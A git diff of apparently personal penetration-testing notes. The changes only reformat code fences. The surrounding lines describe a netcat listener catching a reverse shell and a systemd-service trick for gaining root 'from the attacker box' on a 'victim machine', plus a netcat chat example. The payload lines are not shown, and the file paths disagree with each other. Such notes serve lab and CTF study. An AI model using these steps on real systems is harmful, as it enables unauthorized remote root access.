@@ -6,7 +6,7 @@ Install ```sudo apt install ncat```
 
 Start netcat listening on e.g. port 1234
 
-```sh
+``` sh
 nc -lvnp 1234
 ```
 
@@ -18,7 +18,7 @@ Once payload is triggered netcat will open a reverse shell:
 
 Create 0xfab1.service in /temp/
 
-```txt
+``` txt
 [Unit]
 Description=root
 
@@ -38,7 +38,7 @@ WantedBy=multi-user.target
 
 Now use systemctl on victim machine and we should be root from the attacker box:
 
-```sh
+``` sh
 /bin/systemctl enable /tmp/fab.service
 /bin/systemctl start fab
 ```
@@ -47,12 +47,12 @@ Now use systemctl on victim machine and we should be root from the attacker box:
 
 User 1 (with IP 10.9.182.239) runs this command:
 
-```sh
+``` sh
 nc -l -p 3303
 ```
 
 Other chat user then runs this command:
 
-```sh
+``` sh
 nc 10.9.182.239 3303
 ```
